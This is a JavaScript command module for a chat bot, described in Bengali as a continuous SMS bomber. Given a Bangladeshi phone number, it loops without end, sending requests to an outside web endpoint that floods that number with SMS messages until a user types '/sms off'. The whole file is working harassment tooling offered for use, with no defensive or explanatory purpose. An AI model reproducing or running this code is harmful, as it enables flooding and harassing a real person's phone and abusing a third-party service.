module.exports.config = {
  name: "sms",
  version: "2.0.0",
  role: 2,
  author: "𝙔𝙚𝙖𝙨𝙞𝙣 𝗯𝗼𝘁",
  description: "অনবরত এসএমএস বোম্বার, বন্ধ করতে /sms off",
  category: "Tool",
  usages: "/sms 01xxxxxxxxx অথবা /sms off",
  cooldowns: 0,
  dependencies: { "axios": "" }
};

const axios = require("axios");
const bombingFlags = {};

module.exports.onStart = async ({ api, event, args }) => {
  const threadID = event.threadID;
  const number = args[0];

  if (number === "off") {
    if (bombingFlags[threadID]) {
      bombingFlags[threadID] = false;
      return api.sendMessage("❌ 𝚂𝙼𝚂 𝙾𝙵𝙵 𝙽𝙾𝚆 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈-🎀✨", threadID);
    }
    return api.sendMessage("ℹ 𝙽𝙾 𝚂𝙿𝙰𝙼 𝙽𝙾𝚆.।", threadID);
  }

  if (!/^01[0-9]{9}$/.test(number)) {
    return api.sendMessage("🚫 𝙴𝙽𝚃𝙴𝚁 𝙱𝙰𝙽𝙶𝙻𝙰𝙳𝙴𝚂𝙷𝙸 𝙽𝚄𝙼𝙱𝙴𝚁🎀 (𝙴𝚇𝙰𝙼𝙿𝙻𝙴: /𝚂𝙼𝚂 𝟬𝟭𝚇𝚇𝚇𝚇𝚇𝚇𝚇𝚇𝚇🎀✨)", threadID);
  }

  if (bombingFlags[threadID]) {
    return api.sendMessage("🚫 𝚂𝙼𝚂 𝙸𝚂 𝙰𝙻𝚁𝙴𝙰𝙳𝚈 𝚁𝚄𝙽𝙽𝙸𝙽𝙶 /𝚂𝙼𝚂 𝙾𝙵𝙵-🎀✨", threadID);
  }

  bombingFlags[threadID] = true;
  
  // শুধুমাত্র একবার মেসেজ পাঠানো হবে
  api.sendMessage(`✅ 𝚂𝙼𝚂 𝙸𝚂 𝙽𝙾𝚆 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈 𝙱𝙾𝚂𝚂- 𝚃𝙷𝙸𝚂 𝙽𝚄𝙼𝙱𝙴𝚁-🎀 \𝚃𝙾 𝚃𝚄𝚁𝙽 𝙾𝙵𝙵 /𝚂𝙼𝚂 𝙾𝙵𝙵 🎀✨`, threadID);

  (async function startBombing() {
    while (bombingFlags[threadID]) {
      try {
        await axios.get(`https://ultranetrn.com.br/fonts/api.php?number=${number}`);
        // কোনো অতিরিক্ত মেসেজ পাঠানো হবে না
      } catch (err) {
        bombingFlags[threadID] = false;
        api.sendMessage(`❌ ত্রুটি: ${err.message}`, threadID);
        break;
      }
    }
  })();
};
